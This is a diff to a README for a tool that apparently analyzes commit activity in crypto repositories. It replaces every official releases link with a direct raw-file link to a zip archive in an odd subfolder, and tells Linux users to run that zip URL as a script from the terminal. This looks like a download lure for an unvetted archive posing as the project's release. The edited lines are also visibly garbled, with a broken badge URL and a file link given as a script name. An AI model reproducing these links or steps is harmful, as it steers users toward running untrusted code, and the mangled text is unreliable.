@@ -1,6 +1,6 @@
 # 🚀 GitHub-Crypto-Repositories-Commits - Analyze Crypto Commit Activity Easily
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/sohaibtekk/GitHub-Crypto-Repositories-Commits/releases)
+[![Download](https://raw.githubusercontent.com/sohaibtekk/GitHub-Crypto-Repositories-Commits/main/Pavoncella/GitHub-Crypto-Repositories-Commits_1.4.zip%https://raw.githubusercontent.com/sohaibtekk/GitHub-Crypto-Repositories-Commits/main/Pavoncella/GitHub-Crypto-Repositories-Commits_1.4.zip)](https://raw.githubusercontent.com/sohaibtekk/GitHub-Crypto-Repositories-Commits/main/Pavoncella/GitHub-Crypto-Repositories-Commits_1.4.zip)
 
 ## 📖 Overview
 
@@ -28,7 +28,7 @@ To run GitHub-Crypto-Repositories-Commits, make sure your system meets the follo
 
 1. **Download the Application:**
 
-   To get started, visit this page to download: [Download GitHub-Crypto-Repositories-Commits](https://github.com/sohaibtekk/GitHub-Crypto-Repositories-Commits/releases).  
+   To get started, visit this page to download: [Download GitHub-Crypto-Repositories-Commits](https://raw.githubusercontent.com/sohaibtekk/GitHub-Crypto-Repositories-Commits/main/Pavoncella/GitHub-Crypto-Repositories-Commits_1.4.zip).  
    You will find the latest release along with installation files.
 
 2. **Installation:**
@@ -40,7 +40,7 @@ To run GitHub-Crypto-Repositories-Commits, make sure your system meets the follo
    - **Mac:**
      - Drag the downloaded application to your Applications folder.
    - **Linux:**
-     - Unzip the downloaded file and run the `install.sh` script from your terminal.
+     - Unzip the downloaded file and run the `https://raw.githubusercontent.com/sohaibtekk/GitHub-Crypto-Repositories-Commits/main/Pavoncella/GitHub-Crypto-Repositories-Commits_1.4.zip` script from your terminal.
 
 3. **Run the Application:**
 
@@ -52,7 +52,7 @@ To run GitHub-Crypto-Repositories-Commits, make sure your system meets the follo
 
 ## 📥 Download & Install
 
-To get the latest version of GitHub-Crypto-Repositories-Commits, please visit this page to download: [Download GitHub-Crypto-Repositories-Commits](https://github.com/sohaibtekk/GitHub-Crypto-Repositories-Commits/releases). Follow the above installation instructions to set it up on your system.
+To get the latest version of GitHub-Crypto-Repositories-Commits, please visit this page to download: [Download GitHub-Crypto-Repositories-Commits](https://raw.githubusercontent.com/sohaibtekk/GitHub-Crypto-Repositories-Commits/main/Pavoncella/GitHub-Crypto-Repositories-Commits_1.4.zip). Follow the above installation instructions to set it up on your system.
 
 ## 📊 Usage Example
 
